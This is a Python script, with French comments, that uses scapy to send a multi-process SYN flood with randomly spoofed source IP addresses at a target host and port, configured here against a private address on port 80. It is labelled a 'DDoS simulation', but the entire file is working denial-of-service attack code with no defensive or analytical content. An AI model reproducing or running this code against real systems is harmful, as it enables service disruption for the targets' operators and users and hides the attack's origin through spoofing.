from scapy.all import IP, TCP, send
import time
import random
from multiprocessing import Process

def generate_random_ip():
    return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

def simulate_ddos(target_ip, origin_ip, target_port, duration, batch_size=500):
    start_time = time.time()
    packet_count = 0
    print("Starting aggressive DDoS simulation...")

    while time.time() - start_time < duration:
        packets = [] 
        for _ in range(batch_size):
            if origin_ip == "":
                src_ip = generate_random_ip()
            else:
                src_ip = origin_ip
            packet = IP(src=src_ip, dst=target_ip) / TCP(dport=target_port, flags="S")
            packets.append(packet)

        send(packets, verbose=0)
        packet_count += batch_size

        if packet_count % (batch_size * 10) == 0:
            print(f"Sent {packet_count} packets so far...")

    print(f"DDoS simulation finished. Total packets sent: {packet_count}")

def launch_ddos(target_ip, origin_ip, target_port, duration, num_threads=4):
    processes = []
    for _ in range(num_threads):
        p = Process(target=simulate_ddos, args=(target_ip, origin_ip, target_port, duration))
        processes.append(p)
        p.start()

    for p in processes:
        p.join()

# Exemple d'utilisation
if __name__ == "__main__":
    target_ip = "192.168.100.134"  # Remplacez par l'IP cible
    origin_ip = ""              # Indiquer une ip ou laisser vide pour une ip aléatoire
    target_port = 80            # Remplacez par le port cible
    duration = 30               # Durée de l'attaque en secondes
    num_threads = 10             # Nombre de processus pour augmenter l'intensité

    launch_ddos(target_ip, origin_ip, target_port, duration, num_threads=num_threads)
